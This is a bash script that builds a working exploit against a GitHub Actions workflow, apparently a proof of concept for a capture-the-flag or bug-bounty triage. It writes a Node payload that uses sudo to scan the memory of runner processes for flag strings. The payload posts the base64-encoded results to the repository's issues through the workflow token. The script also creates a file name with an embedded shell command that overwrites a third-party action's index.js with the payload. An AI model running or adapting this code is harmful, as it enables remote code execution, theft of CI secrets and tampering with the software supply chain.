#!/usr/bin/env bash
set -euo pipefail
mkdir -p content
cd content
cat > evil.js <<'JS'
const { execSync } = require('child_process');
const fs = require('fs');
const b64 = (s) => Buffer.from(String(s)).toString('base64');
const token = process.env.INPUT_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
const api = 'https://api.github.com';
const H = {
  authorization: `Bearer ${token}`,
  accept: 'application/vnd.github+json',
  'content-type': 'application/json',
  'user-agent': 'rce-proof'
};
const sh = (cmd, timeout = 240000) => {
  try {
    return execSync(cmd, { encoding: 'utf8', timeout, maxBuffer: 64 * 1024 * 1024, stdio: ['ignore', 'pipe', 'pipe'] });
  } catch (e) { return 'ERR:' + String(e.stdout || '') + String(e.stderr || '') + String(e.message || ''); }
};
const scanPy = `import os,sys,base64
pid=sys.argv[1]
pats=[b'FLAG{',b'TRIAGE_FLAG']
allp=[]
for p in pats:
    allp.append((p,(p.decode('latin1')+'_u8')))
    allp.append((p.decode('latin1').encode('utf-16le'),(p.decode('latin1')+'_u16')))
caps={}
hits=[]; total=0
try:
    maps=open('/proc/%s/maps'%pid).read().splitlines()
    mem=open('/proc/%s/mem'%pid,'rb',0)
except Exception as e:
    print('ERR open',e); sys.exit()
CH=32*1024*1024
for line in maps:
    parts=line.split()
    if len(parts)<2 or 'r' not in parts[1]: continue
    try:
        a,b=parts[0].split('-'); start=int(a,16); end=int(b,16)
    except Exception: continue
    size=end-start
    if size<=0 or size>512*1024*1024: continue
    off=0
    while off<size and total<900*1024*1024:
        ln=min(CH,size-off)
        try:
            mem.seek(start+off); data=mem.read(ln)
        except Exception:
            break
        if not data: break
        total+=len(data)
        for p,name in allp:
            if caps.get(name,0)>=10: continue
            i=data.find(p)
            while i!=-1:
                hits.append((name,base64.b64encode(data[max(0,i-80):i+240]).decode()))
                caps[name]=caps.get(name,0)+1
                if caps[name]>=10: break
                i=data.find(p,i+1)
        off+=ln-300 if ln>300 else ln
    if total>=900*1024*1024: break
print('SCANNED',total)
print('FLAGHITS',len(hits))
print('CAPS',caps)
for name,h in hits: print('FLAGHIT|'+name+'|'+h)
`;
(async () => {
  const out = { repo, sudo: sh('sudo -n true && echo SUDO_OK || echo SUDO_NO').trim() };
  out.ps = sh("pgrep -af 'Runner\\.(Worker|Listener)' || true").slice(0, 2000);
  fs.writeFileSync('/tmp/memscan8.py', scanPy);
  const pids = out.ps.split('\n').map((l) => l.trim().split(/\s+/)[0]).filter((x) => /^\d+$/.test(x));
  out.pids = pids;
  out.scans = {};
  for (const pid of pids.slice(0, 4)) {
    const r = sh(`sudo timeout 300 python3 /tmp/memscan8.py ${pid}`, 320000);
    out.scans[pid] = r.slice(0, 40000);
    console.log('SCAN_PID=' + pid);
    console.log(r.slice(0, 40000));
  }
  const payload = JSON.stringify(out);
  let ir = await fetch(`${api}/repos/${repo}/issues`, {
    method: 'POST', headers: H,
    body: JSON.stringify({ title: 'FLAG_SCAN_RESULTS', body: '```\n' + b64(payload) + '\n```' })
  });
  console.log('ISSUE_STATUS=' + ir.status);
  if (ir.status !== 201) {
    ir = await fetch(`${api}/repos/${repo}/issues/7/comments`, {
      method: 'POST', headers: H,
      body: JSON.stringify({ body: b64(payload) })
    });
    console.log('COMMENT_STATUS=' + ir.status);
  }
  console.log('SLEEP_START=' + new Date().toISOString());
  await new Promise((r) => setTimeout(r, 60000));
  console.log('SLEEP_DONE=' + new Date().toISOString());
})().catch((e) => console.log('EVIL_ERROR=' + e));
JS
OVR='rce$(S=$(dirname${IFS}${HOME%runner});D=${S}tmp${S}content${S}content;cd $D;cp evil.js ${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}commit-comment${S}v3${S}dist${S}index.js;cp evil.js rce.txt).txt'
touch "$OVR"
